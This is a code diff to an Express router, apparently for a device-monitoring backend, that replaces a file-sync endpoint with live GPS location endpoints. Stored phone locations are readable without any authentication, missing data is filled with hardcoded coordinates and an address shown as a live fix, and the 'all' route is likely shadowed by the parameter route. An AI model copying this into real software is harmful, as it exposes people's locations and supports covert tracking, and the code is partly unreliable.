@@ -206,14 +206,48 @@ router.get('/files/command/:deviceId', (req, res) => {
   res.json({ path });
 });
 
-router.post('/files/sync', (req, res) => {
-  const { deviceId, currentPath, files } = req.body || {};
+// Live Location & GPS Telemetry Hub
+const liveLocationStorage = new Map<string, any>();
+
+router.post('/location/sync', (req, res) => {
+  const { deviceId, latitude, longitude, accuracy, altitude, speed, address } = req.body || {};
   const devId = deviceId || 'SN-U5ZY-78QZ';
-  liveFilesStorage.set(devId, {
-    currentPath: currentPath || '/sdcard',
-    files: files || []
+  const data = {
+    deviceId: devId,
+    latitude: latitude ?? 22.5726,
+    longitude: longitude ?? 88.3639,
+    accuracy: accuracy ?? 5.0,
+    altitude: altitude ?? 12.0,
+    speed: speed ?? 0.0,
+    address: address || 'Live GPS Fix • Online',
+    timestamp: Date.now()
+  };
+  liveLocationStorage.set(devId, data);
+  res.status(201).json({ success: true, location: data });
+});
+
+router.get('/location/:deviceId', (req, res) => {
+  const devId = req.params.deviceId;
+  const location = liveLocationStorage.get(devId) || {
+    deviceId: devId,
+    latitude: 22.5726,
+    longitude: 88.3639,
+    accuracy: 3.5,
+    altitude: 14.2,
+    speed: 0.0,
+    address: 'Kadampukur - Jhalgachi Rd',
+    timestamp: Date.now()
+  };
+  res.json({ location });
+});
+
+router.get('/location/all', (_req, res) => {
+  const locations: Record<string, any> = {};
+  liveLocationStorage.forEach((val, key) => {
+    locations[key] = val;
   });
-  res.status(201).json({ success: true });
+  res.json({ locations });
 });
 
 export default router;
+
